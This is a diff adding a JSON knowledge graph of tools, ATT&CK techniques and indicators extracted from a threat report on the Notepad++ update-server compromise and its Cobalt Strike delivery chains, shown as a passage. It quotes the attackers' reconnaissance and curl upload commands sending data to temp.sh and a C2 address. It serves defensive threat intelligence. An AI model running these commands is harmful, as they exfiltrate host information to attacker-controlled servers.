@@ -1,0 +1,1356 @@
+{
+  "nodes": {
+    "high_level": [
+      {
+        "node_id": "HL_19119052b5b0",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "curl.exe",
+        "edges": [
+          "EDGE_1"
+        ],
+        "sentence_indices": [
+          9
+        ],
+        "span_sentences": [
+          "This is done through the following steps:\n- The file creates a directory named\n%appdata%\\ProShow\nand sets it as the current directory; - It executes the shell command\ncmd /c whoami&&tasklist > 1.txt\n, thus creating a file with the shell command execution results in the%appdata%\\ProShow\ndirectory; - Then it uploads the\n1.txt\nfile to the temp[.]sh hosting service by executing thecurl.exe -F \"file=@1.txt\" -s https://temp.sh/upload\ncommand; - Next, it sends the URL to the uploaded\n1.txt\nfile by using thecurl.exe --user-agent \"https://temp.sh/ZMRKV/1.txt\" -s http://45.76.155[.]202\nshell command."
+        ]
+      },
+      {
+        "node_id": "HL_1cc8a7cd6345",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "Metasploit",
+        "edges": [
+          "EDGE_2"
+        ],
+        "sentence_indices": [
+          21,
+          34,
+          41,
+          50
+        ],
+        "span_sentences": [
+          "It decrypts a Metasploit downloader payload that retrieves a Cobalt Strike Beacon shellcode from the URL https://45.77.31[.]210/users/admin (user agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36) and launches it.",
+          "The launched shellcode is, just in the case of chain #1, a Metasploit downloader, which downloads a Cobalt Strike Beacon payload, again in the form of a shellcode, from the URL https://cdncheck.it[.]com/users/admin.",
+          "By using it, attackers performed the following:\n- Changed the system information upload URL to https://self-dns.it[.]com/list;\n- Changed the user agent used in HTTP requests to Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36;\n- Changed the URL used by the Metasploit downloader to https://safe-dns.it[.]com/help/Get-Start;\n- Changed the Cobalt Strike Beacon C2 server URLs to https://safe-dns.it[.]com/resolve and https://safe-dns.it[.]com/dns-query.",
+          "Still, this payload used the previously mentioned self-dns.it[.]com and safe-dns.it[.]com domain names for system information uploading, Metasploit downloader and Cobalt Strike Beacon communications."
+        ]
+      },
+      {
+        "node_id": "HL_2f021d2af20b",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "ProShow",
+        "edges": [
+          "EDGE_3"
+        ],
+        "sentence_indices": [
+          9,
+          13,
+          14,
+          17,
+          19,
+          20
+        ],
+        "span_sentences": [
+          "This is done through the following steps:\n- The file creates a directory named\n%appdata%\\ProShow\nand sets it as the current directory; - It executes the shell command\ncmd /c whoami&&tasklist > 1.txt\n, thus creating a file with the shell command execution results in the%appdata%\\ProShow\ndirectory; - Then it uploads the\n1.txt\nfile to the temp[.]sh hosting service by executing thecurl.exe -F \"file=@1.txt\" -s https://temp.sh/upload\ncommand; - Next, it sends the URL to the uploaded\n1.txt\nfile by using thecurl.exe --user-agent \"https://temp.sh/ZMRKV/1.txt\" -s http://45.76.155[.]202\nshell command.",
+          "To do that, it performs the following actions:\n- Drops the following files to the\n%appdata%\\ProShow\ndirectory:ProShow.exe\n(SHA1: defb05d5a91e4920c9e22de2d81c5dc9b95a9a7c)defscr\n(SHA1: 259cd3542dea998c57f67ffdd4543ab836e3d2a3)if.dnt\n(SHA1: 46654a7ad6bc809b623c51938954de48e27a5618)proshow.crs\nproshow.phd\nproshow_e.bmp\n(SHA1: 9df6ecc47b192260826c247bf8d40384aa6e6fd6)load\n(SHA1: 06a6a5a39193075734a32e0235bde0e979c27228)\n- Executes the dropped\nProShow.exe\nfile.",
+          "The ProShow.exe\nfile being launched is legitimate ProShow software, which is abused to launch a malicious payload.",
+          "Instead, they abused an old, known vulnerability in the ProShow software, which dates back to early 2010s.",
+          "It is worth noting that, apart from this payload, all files in the %appdata%\\ProShow\ndirectory are legitimate.",
+          "The second shellcode, which is stored in the middle of the file, is the one that is launched when ProShow.exe\nis started."
+        ]
+      },
+      {
+        "node_id": "HL_3c9e3682cbfd",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "VirusTotal",
+        "edges": [],
+        "sentence_indices": [
+          7
+        ],
+        "span_sentences": [
+          "Notably, the first scan of this URL on the VirusTotal platform occurred in late September, by a user from Taiwan."
+        ]
+      },
+      {
+        "node_id": "HL_42eb567c1aad",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "Chrysalis",
+        "edges": [],
+        "sentence_indices": [
+          48
+        ],
+        "span_sentences": [
+          "This particular execution chain has already been described by Rapid7, and the final payload observed in it is the custom Chrysalis backdoor."
+        ]
+      },
+      {
+        "node_id": "HL_514b9e64f22f",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Notepad++",
+        "edges": [
+          "EDGE_4"
+        ],
+        "sentence_indices": [
+          0,
+          3,
+          5,
+          11,
+          24,
+          58
+        ],
+        "span_sentences": [
+          "On February 2, 2026, the developers of Notepad++, a text editor popular among developers, published a statement claiming that the update infrastructure of Notepad++ had been compromised.",
+          "We identified that over the course of four months, from July to October 2025, attackers who had compromised Notepad++ had been constantly rotating C2 server addresses used for distributing malicious updates, the downloaders used for implant delivery, as well as the final payloads.",
+          "We observed attackers to deploy a malicious Notepad++ update for the first time in late July 2025.",
+          "Notably, the same behavior of malicious Notepad++ updates, specifically the launch of shell commands and the use of the temp[.]sh website for file uploading, was described on the Notepad++ community forums by a user named soft-parsley.",
+          "Later on, in early August 2025, we observed attackers to use the same download URL for the update.exe\nfiles (observed SHA1 hash: 90e677d7ff5844407b9c073e3b7e896e078e11cd), as well as the same execution chain for delivery of Cobalt Strike Beacon via malicious Notepad++ updates.",
+          "The variety of infection chains makes detection of the Notepad++ supply chain attack quite a difficult, and at the same time creative, task."
+        ]
+      },
+      {
+        "node_id": "HL_6ac30a99bcb8",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "NSIS",
+        "edges": [],
+        "sentence_indices": [
+          28,
+          44
+        ],
+        "span_sentences": [
+          "The malicious update was still being distributed from the URL http://45.76.155[.]202/update/update.exe, and the file downloaded from it (SHA1 hash: 573549869e84544e3ef253bdba79851dcde4963a) was an NSIS installer as well.",
+          "The payload downloaded (SHA1: d7ffd7b588880cf61b603346a3557e7cce648c93) was still a NSIS installer, however, unlike in the case of chains 1 and 2, this installer did not include the system information sending functionality."
+        ]
+      },
+      {
+        "node_id": "HL_6f83a0450955",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Rapid7",
+        "edges": [],
+        "sentence_indices": [
+          48
+        ],
+        "span_sentences": [
+          "This particular execution chain has already been described by Rapid7, and the final payload observed in it is the custom Chrysalis backdoor."
+        ]
+      },
+      {
+        "node_id": "HL_ae46f8528d16",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "Taiwan",
+        "edges": [],
+        "sentence_indices": [
+          7
+        ],
+        "span_sentences": [
+          "Notably, the first scan of this URL on the VirusTotal platform occurred in late September, by a user from Taiwan."
+        ]
+      },
+      {
+        "node_id": "HL_fe58dfa21a1b",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "Cobalt Strike Beacon",
+        "edges": [
+          "EDGE_5",
+          "EDGE_6",
+          "EDGE_7",
+          "EDGE_8"
+        ],
+        "sentence_indices": [
+          21,
+          22,
+          24,
+          34,
+          38,
+          41,
+          50
+        ],
+        "span_sentences": [
+          "It decrypts a Metasploit downloader payload that retrieves a Cobalt Strike Beacon shellcode from the URL https://45.77.31[.]210/users/admin (user agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36) and launches it.",
+          "The Cobalt Strike Beacon payload is designed to communicate with the cdncheck.it[.]com C2 server.",
+          "Later on, in early August 2025, we observed attackers to use the same download URL for the update.exe\nfiles (observed SHA1 hash: 90e677d7ff5844407b9c073e3b7e896e078e11cd), as well as the same execution chain for delivery of Cobalt Strike Beacon via malicious Notepad++ updates.",
+          "The launched shellcode is, just in the case of chain #1, a Metasploit downloader, which downloads a Cobalt Strike Beacon payload, again in the form of a shellcode, from the URL https://cdncheck.it[.]com/users/admin.",
+          "The Cobalt Strike Beacon payload delivered through it was configured to use the same URLs observed in mid-September, however, attackers changed the way system information was collected.",
+          "By using it, attackers performed the following:\n- Changed the system information upload URL to https://self-dns.it[.]com/list;\n- Changed the user agent used in HTTP requests to Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36;\n- Changed the URL used by the Metasploit downloader to https://safe-dns.it[.]com/help/Get-Start;\n- Changed the Cobalt Strike Beacon C2 server URLs to https://safe-dns.it[.]com/resolve and https://safe-dns.it[.]com/dns-query.",
+          "Still, this payload used the previously mentioned self-dns.it[.]com and safe-dns.it[.]com domain names for system information uploading, Metasploit downloader and Cobalt Strike Beacon communications."
+        ]
+      }
+    ],
+    "ttp": [
+      {
+        "node_id": "TTP_T1027",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1027",
+        "edges": [],
+        "best_span_ranges": [
+          [
+            21,
+            21
+          ],
+          [
+            46,
+            46
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "It decrypts a Metasploit downloader payload that retrieves a Cobalt Strike Beacon shellcode from the URL https://45.77.31[.]210/users/admin (user agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36) and launches it."
+          ],
+          [
+            "This execution chain relies on the sideloading of the log.dll\nfile, which is responsible for launching the encrypted BluetoothService\nshellcode into the BluetoothService.exe\nprocess."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1041",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1041",
+        "edges": [
+          "EDGE_16",
+          "EDGE_19",
+          "EDGE_28",
+          "EDGE_35"
+        ],
+        "best_span_ranges": [
+          [
+            49,
+            50
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "In mid-October 2025, we observed attackers to resume deployments of the chain #2 payload (SHA1 hash: 821c0cafb2aab0f063ef7e313f64313fc81d46cd) using yet another URL: http://95.179.213[.]0/update/update.exe.",
+            "Still, this payload used the previously mentioned self-dns.it[.]com and safe-dns.it[.]com domain names for system information uploading, Metasploit downloader and Cobalt Strike Beacon communications."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1055",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1055",
+        "edges": [],
+        "best_span_ranges": [
+          [
+            46,
+            46
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "This execution chain relies on the sideloading of the log.dll\nfile, which is responsible for launching the encrypted BluetoothService\nshellcode into the BluetoothService.exe\nprocess."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1057",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1057",
+        "edges": [],
+        "best_span_ranges": [
+          [
+            38,
+            39
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "The Cobalt Strike Beacon payload delivered through it was configured to use the same URLs observed in mid-September, however, attackers changed the way system information was collected.",
+            "Specifically, attackers split the single shell command they used for this (cmd /c \"whoami&&tasklist&&systeminfo&&netstat -ano\" > a.txt\n) into multiple commands:\ncmd /c whoami >> a.txt\ncmd /c tasklist >> a.txt\ncmd /c systeminfo >> a.txt\ncmd /c netstat -ano >> a.txt\nNotably, the same sequence of commands was previously documented by the user soft-parsley on the Notepad++ community forums."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1059",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1059",
+        "edges": [
+          "EDGE_1",
+          "EDGE_5"
+        ],
+        "best_span_ranges": [
+          [
+            9,
+            9
+          ],
+          [
+            13,
+            13
+          ],
+          [
+            32,
+            32
+          ],
+          [
+            38,
+            39
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "This is done through the following steps:\n- The file creates a directory named\n%appdata%\\ProShow\nand sets it as the current directory; - It executes the shell command\ncmd /c whoami&&tasklist > 1.txt\n, thus creating a file with the shell command execution results in the%appdata%\\ProShow\ndirectory; - Then it uploads the\n1.txt\nfile to the temp[.]sh hosting service by executing thecurl.exe -F \"file=@1.txt\" -s https://temp.sh/upload\ncommand; - Next, it sends the URL to the uploaded\n1.txt\nfile by using thecurl.exe --user-agent \"https://temp.sh/ZMRKV/1.txt\" -s http://45.76.155[.]202\nshell command."
+          ],
+          [
+            "To do that, it performs the following actions:\n- Drops the following files to the\n%appdata%\\ProShow\ndirectory:ProShow.exe\n(SHA1: defb05d5a91e4920c9e22de2d81c5dc9b95a9a7c)defscr\n(SHA1: 259cd3542dea998c57f67ffdd4543ab836e3d2a3)if.dnt\n(SHA1: 46654a7ad6bc809b623c51938954de48e27a5618)proshow.crs\nproshow.phd\nproshow_e.bmp\n(SHA1: 9df6ecc47b192260826c247bf8d40384aa6e6fd6)load\n(SHA1: 06a6a5a39193075734a32e0235bde0e979c27228)\n- Executes the dropped\nProShow.exe\nfile."
+          ],
+          [
+            "As such, the previously mentioned command is used by attackers to launch a compiled Lua script, located in the alien.ini\nfile."
+          ],
+          [
+            "The Cobalt Strike Beacon payload delivered through it was configured to use the same URLs observed in mid-September, however, attackers changed the way system information was collected.",
+            "Specifically, attackers split the single shell command they used for this (cmd /c \"whoami&&tasklist&&systeminfo&&netstat -ano\" > a.txt\n) into multiple commands:\ncmd /c whoami >> a.txt\ncmd /c tasklist >> a.txt\ncmd /c systeminfo >> a.txt\ncmd /c netstat -ano >> a.txt\nNotably, the same sequence of commands was previously documented by the user soft-parsley on the Notepad++ community forums."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1071",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1071",
+        "edges": [
+          "EDGE_6",
+          "EDGE_12",
+          "EDGE_17",
+          "EDGE_27",
+          "EDGE_32",
+          "EDGE_33",
+          "EDGE_34"
+        ],
+        "best_span_ranges": [
+          [
+            5,
+            8
+          ],
+          [
+            9,
+            9
+          ],
+          [
+            21,
+            21
+          ],
+          [
+            22,
+            22
+          ],
+          [
+            41,
+            41
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "We observed attackers to deploy a malicious Notepad++ update for the first time in late July 2025.",
+            "It was hosted at http://45.76.155[.]202/update/update.exe.",
+            "Notably, the first scan of this URL on the VirusTotal platform occurred in late September, by a user from Taiwan.",
+            "When started, it sends a heartbeat containing system information to the attackers."
+          ],
+          [
+            "This is done through the following steps:\n- The file creates a directory named\n%appdata%\\ProShow\nand sets it as the current directory; - It executes the shell command\ncmd /c whoami&&tasklist > 1.txt\n, thus creating a file with the shell command execution results in the%appdata%\\ProShow\ndirectory; - Then it uploads the\n1.txt\nfile to the temp[.]sh hosting service by executing thecurl.exe -F \"file=@1.txt\" -s https://temp.sh/upload\ncommand; - Next, it sends the URL to the uploaded\n1.txt\nfile by using thecurl.exe --user-agent \"https://temp.sh/ZMRKV/1.txt\" -s http://45.76.155[.]202\nshell command."
+          ],
+          [
+            "It decrypts a Metasploit downloader payload that retrieves a Cobalt Strike Beacon shellcode from the URL https://45.77.31[.]210/users/admin (user agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36) and launches it."
+          ],
+          [
+            "The Cobalt Strike Beacon payload is designed to communicate with the cdncheck.it[.]com C2 server."
+          ],
+          [
+            "By using it, attackers performed the following:\n- Changed the system information upload URL to https://self-dns.it[.]com/list;\n- Changed the user agent used in HTTP requests to Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36;\n- Changed the URL used by the Metasploit downloader to https://safe-dns.it[.]com/help/Get-Start;\n- Changed the Cobalt Strike Beacon C2 server URLs to https://safe-dns.it[.]com/resolve and https://safe-dns.it[.]com/dns-query."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1082",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1082",
+        "edges": [],
+        "best_span_ranges": [
+          [
+            5,
+            8
+          ],
+          [
+            38,
+            39
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "We observed attackers to deploy a malicious Notepad++ update for the first time in late July 2025.",
+            "It was hosted at http://45.76.155[.]202/update/update.exe.",
+            "Notably, the first scan of this URL on the VirusTotal platform occurred in late September, by a user from Taiwan.",
+            "When started, it sends a heartbeat containing system information to the attackers."
+          ],
+          [
+            "The Cobalt Strike Beacon payload delivered through it was configured to use the same URLs observed in mid-September, however, attackers changed the way system information was collected.",
+            "Specifically, attackers split the single shell command they used for this (cmd /c \"whoami&&tasklist&&systeminfo&&netstat -ano\" > a.txt\n) into multiple commands:\ncmd /c whoami >> a.txt\ncmd /c tasklist >> a.txt\ncmd /c systeminfo >> a.txt\ncmd /c netstat -ano >> a.txt\nNotably, the same sequence of commands was previously documented by the user soft-parsley on the Notepad++ community forums."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1102",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1102",
+        "edges": [
+          "EDGE_9",
+          "EDGE_13",
+          "EDGE_24",
+          "EDGE_30"
+        ],
+        "best_span_ranges": [
+          [
+            25,
+            25
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "However, we noted the following differences:\n- In the Metasploit downloader payload, the URL for downloading Cobalt Strike Beacon was set to https://cdncheck.it[.]com/users/admin;\n- The Cobalt Strike C2 server URLs were set to https://cdncheck.it[.]com/api/update/v1 and https://cdncheck.it[.]com/api/Metadata/submit."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1105",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1105",
+        "edges": [
+          "EDGE_2",
+          "EDGE_7",
+          "EDGE_10",
+          "EDGE_11",
+          "EDGE_14",
+          "EDGE_15",
+          "EDGE_20",
+          "EDGE_22",
+          "EDGE_23",
+          "EDGE_25",
+          "EDGE_26",
+          "EDGE_29",
+          "EDGE_31",
+          "EDGE_36"
+        ],
+        "best_span_ranges": [
+          [
+            3,
+            3
+          ],
+          [
+            21,
+            21
+          ],
+          [
+            24,
+            24
+          ],
+          [
+            25,
+            25
+          ],
+          [
+            31,
+            31
+          ],
+          [
+            34,
+            34
+          ],
+          [
+            42,
+            43
+          ],
+          [
+            49,
+            50
+          ],
+          [
+            51,
+            52
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "We identified that over the course of four months, from July to October 2025, attackers who had compromised Notepad++ had been constantly rotating C2 server addresses used for distributing malicious updates, the downloaders used for implant delivery, as well as the final payloads."
+          ],
+          [
+            "It decrypts a Metasploit downloader payload that retrieves a Cobalt Strike Beacon shellcode from the URL https://45.77.31[.]210/users/admin (user agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36) and launches it."
+          ],
+          [
+            "Later on, in early August 2025, we observed attackers to use the same download URL for the update.exe\nfiles (observed SHA1 hash: 90e677d7ff5844407b9c073e3b7e896e078e11cd), as well as the same execution chain for delivery of Cobalt Strike Beacon via malicious Notepad++ updates."
+          ],
+          [
+            "However, we noted the following differences:\n- In the Metasploit downloader payload, the URL for downloading Cobalt Strike Beacon was set to https://cdncheck.it[.]com/users/admin;\n- The Cobalt Strike C2 server URLs were set to https://cdncheck.it[.]com/api/update/v1 and https://cdncheck.it[.]com/api/Metadata/submit."
+          ],
+          [
+            "The created a.txt\nfile was, just as in the case of stage #1, uploaded to the temp[.]sh website through curl, with the obtained temp[.]sh URL being transferred to the same http://45.76.155[.]202/list endpoint, inside the User-Agent header."
+          ],
+          [
+            "The launched shellcode is, just in the case of chain #1, a Metasploit downloader, which downloads a Cobalt Strike Beacon payload, again in the form of a shellcode, from the URL https://cdncheck.it[.]com/users/admin."
+          ],
+          [
+            "In early October 2025, the attackers changed the infection chain once again.",
+            "They also changed the C2 server for distributing malicious updates, with the observed update URL being http://45.32.144[.]255/update/update.exe."
+          ],
+          [
+            "In mid-October 2025, we observed attackers to resume deployments of the chain #2 payload (SHA1 hash: 821c0cafb2aab0f063ef7e313f64313fc81d46cd) using yet another URL: http://95.179.213[.]0/update/update.exe.",
+            "Still, this payload used the previously mentioned self-dns.it[.]com and safe-dns.it[.]com domain names for system information uploading, Metasploit downloader and Cobalt Strike Beacon communications."
+          ],
+          [
+            "Further in late October 2025, we observed attackers to start changing URLs used for malicious update deliveries.",
+            "Specifically, attackers started using the following URLs:\n- http://95.179.213[.]0/update/install.exe;\n- http://95.179.213[.]0/update/update.exe;\n- http://95.179.213[.]0/update/AutoUpdater.exe."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1195",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1195",
+        "edges": [
+          "EDGE_4",
+          "EDGE_8",
+          "EDGE_21"
+        ],
+        "best_span_ranges": [
+          [
+            0,
+            3
+          ],
+          [
+            5,
+            6
+          ],
+          [
+            24,
+            24
+          ],
+          [
+            27,
+            27
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "On February 2, 2026, the developers of Notepad++, a text editor popular among developers, published a statement claiming that the update infrastructure of Notepad++ had been compromised.",
+            "According to the statement, this was due to a hosting provider-level incident, which occurred from June to September 2025.",
+            "However, attackers had been able to retain access to internal services until December 2025.",
+            "We identified that over the course of four months, from July to October 2025, attackers who had compromised Notepad++ had been constantly rotating C2 server addresses used for distributing malicious updates, the downloaders used for implant delivery, as well as the final payloads."
+          ],
+          [
+            "We observed attackers to deploy a malicious Notepad++ update for the first time in late July 2025.",
+            "It was hosted at http://45.76.155[.]202/update/update.exe."
+          ],
+          [
+            "Later on, in early August 2025, we observed attackers to use the same download URL for the update.exe\nfiles (observed SHA1 hash: 90e677d7ff5844407b9c073e3b7e896e078e11cd), as well as the same execution chain for delivery of Cobalt Strike Beacon via malicious Notepad++ updates."
+          ],
+          [
+            "A month and a half after malicious update detections ceased, we observed attackers to resume deploying these updates in the middle of September 2025, using another infection chain."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1203",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1203",
+        "edges": [
+          "EDGE_3"
+        ],
+        "best_span_ranges": [
+          [
+            14,
+            17
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "The ProShow.exe\nfile being launched is legitimate ProShow software, which is abused to launch a malicious payload.",
+            "Normally, when threat actors aim to execute a malicious payload inside a legitimate process, they resort to the DLL sideloading technique.",
+            "However, this time attackers decided to avoid using it — likely due to how much attention this technique receives nowadays.",
+            "Instead, they abused an old, known vulnerability in the ProShow software, which dates back to early 2010s."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1567",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1567",
+        "edges": [
+          "EDGE_18"
+        ],
+        "best_span_ranges": [
+          [
+            9,
+            9
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "This is done through the following steps:\n- The file creates a directory named\n%appdata%\\ProShow\nand sets it as the current directory; - It executes the shell command\ncmd /c whoami&&tasklist > 1.txt\n, thus creating a file with the shell command execution results in the%appdata%\\ProShow\ndirectory; - Then it uploads the\n1.txt\nfile to the temp[.]sh hosting service by executing thecurl.exe -F \"file=@1.txt\" -s https://temp.sh/upload\ncommand; - Next, it sends the URL to the uploaded\n1.txt\nfile by using thecurl.exe --user-agent \"https://temp.sh/ZMRKV/1.txt\" -s http://45.76.155[.]202\nshell command."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1574",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1574",
+        "edges": [],
+        "best_span_ranges": [
+          [
+            46,
+            46
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "This execution chain relies on the sideloading of the log.dll\nfile, which is responsible for launching the encrypted BluetoothService\nshellcode into the BluetoothService.exe\nprocess."
+          ]
+        ]
+      }
+    ],
+    "ioc": [
+      {
+        "node_id": "IOC_07f5756eccea",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "https://cdncheck.it[.]com/api/Metadata/submit",
+        "edges": [
+          "EDGE_9",
+          "EDGE_10"
+        ],
+        "sentence_indices": [
+          25
+        ],
+        "span_sentences": [
+          "However, we noted the following differences:\n- In the Metasploit downloader payload, the URL for downloading Cobalt Strike Beacon was set to https://cdncheck.it[.]com/users/admin;\n- The Cobalt Strike C2 server URLs were set to https://cdncheck.it[.]com/api/update/v1 and https://cdncheck.it[.]com/api/Metadata/submit."
+        ]
+      },
+      {
+        "node_id": "IOC_0941e865e75d",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "http://95.179.213[.]0/update/update.exe",
+        "edges": [
+          "EDGE_11"
+        ],
+        "sentence_indices": [
+          49,
+          52
+        ],
+        "span_sentences": [
+          "In mid-October 2025, we observed attackers to resume deployments of the chain #2 payload (SHA1 hash: 821c0cafb2aab0f063ef7e313f64313fc81d46cd) using yet another URL: http://95.179.213[.]0/update/update.exe.",
+          "Specifically, attackers started using the following URLs:\n- http://95.179.213[.]0/update/install.exe;\n- http://95.179.213[.]0/update/update.exe;\n- http://95.179.213[.]0/update/AutoUpdater.exe."
+        ]
+      },
+      {
+        "node_id": "IOC_0e28ff84676c",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "https://safe-dns.it[.]com/resolve",
+        "edges": [
+          "EDGE_12"
+        ],
+        "sentence_indices": [
+          41
+        ],
+        "span_sentences": [
+          "By using it, attackers performed the following:\n- Changed the system information upload URL to https://self-dns.it[.]com/list;\n- Changed the user agent used in HTTP requests to Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36;\n- Changed the URL used by the Metasploit downloader to https://safe-dns.it[.]com/help/Get-Start;\n- Changed the Cobalt Strike Beacon C2 server URLs to https://safe-dns.it[.]com/resolve and https://safe-dns.it[.]com/dns-query."
+        ]
+      },
+      {
+        "node_id": "IOC_13b63b32c289",
+        "node_class": "ioc",
+        "node_type": "Hash",
+        "node_text": "259cd3542dea998c57f67ffdd4543ab836e3d2a3",
+        "edges": [],
+        "sentence_indices": [
+          13
+        ],
+        "span_sentences": [
+          "To do that, it performs the following actions:\n- Drops the following files to the\n%appdata%\\ProShow\ndirectory:ProShow.exe\n(SHA1: defb05d5a91e4920c9e22de2d81c5dc9b95a9a7c)defscr\n(SHA1: 259cd3542dea998c57f67ffdd4543ab836e3d2a3)if.dnt\n(SHA1: 46654a7ad6bc809b623c51938954de48e27a5618)proshow.crs\nproshow.phd\nproshow_e.bmp\n(SHA1: 9df6ecc47b192260826c247bf8d40384aa6e6fd6)load\n(SHA1: 06a6a5a39193075734a32e0235bde0e979c27228)\n- Executes the dropped\nProShow.exe\nfile."
+        ]
+      },
+      {
+        "node_id": "IOC_2392eca92438",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "https://cdncheck.it[.]com/api/update/v1",
+        "edges": [
+          "EDGE_13",
+          "EDGE_14"
+        ],
+        "sentence_indices": [
+          25
+        ],
+        "span_sentences": [
+          "However, we noted the following differences:\n- In the Metasploit downloader payload, the URL for downloading Cobalt Strike Beacon was set to https://cdncheck.it[.]com/users/admin;\n- The Cobalt Strike C2 server URLs were set to https://cdncheck.it[.]com/api/update/v1 and https://cdncheck.it[.]com/api/Metadata/submit."
+        ]
+      },
+      {
+        "node_id": "IOC_286a246825ab",
+        "node_class": "ioc",
+        "node_type": "Hash",
+        "node_text": "4c9aac447bf732acc97992290aa7a187b967ee2c",
+        "edges": [],
+        "sentence_indices": [
+          40
+        ],
+        "span_sentences": [
+          "The other update.exe\nfile had the SHA1 hash 4c9aac447bf732acc97992290aa7a187b967ee2c."
+        ]
+      },
+      {
+        "node_id": "IOC_2e4b648bd0af",
+        "node_class": "ioc",
+        "node_type": "Hash",
+        "node_text": "9df6ecc47b192260826c247bf8d40384aa6e6fd6",
+        "edges": [],
+        "sentence_indices": [
+          13
+        ],
+        "span_sentences": [
+          "To do that, it performs the following actions:\n- Drops the following files to the\n%appdata%\\ProShow\ndirectory:ProShow.exe\n(SHA1: defb05d5a91e4920c9e22de2d81c5dc9b95a9a7c)defscr\n(SHA1: 259cd3542dea998c57f67ffdd4543ab836e3d2a3)if.dnt\n(SHA1: 46654a7ad6bc809b623c51938954de48e27a5618)proshow.crs\nproshow.phd\nproshow_e.bmp\n(SHA1: 9df6ecc47b192260826c247bf8d40384aa6e6fd6)load\n(SHA1: 06a6a5a39193075734a32e0235bde0e979c27228)\n- Executes the dropped\nProShow.exe\nfile."
+        ]
+      },
+      {
+        "node_id": "IOC_399c066dac59",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "%appdata%\\ProShow",
+        "edges": [],
+        "sentence_indices": [
+          9,
+          13,
+          19
+        ],
+        "span_sentences": [
+          "This is done through the following steps:\n- The file creates a directory named\n%appdata%\\ProShow\nand sets it as the current directory; - It executes the shell command\ncmd /c whoami&&tasklist > 1.txt\n, thus creating a file with the shell command execution results in the%appdata%\\ProShow\ndirectory; - Then it uploads the\n1.txt\nfile to the temp[.]sh hosting service by executing thecurl.exe -F \"file=@1.txt\" -s https://temp.sh/upload\ncommand; - Next, it sends the URL to the uploaded\n1.txt\nfile by using thecurl.exe --user-agent \"https://temp.sh/ZMRKV/1.txt\" -s http://45.76.155[.]202\nshell command.",
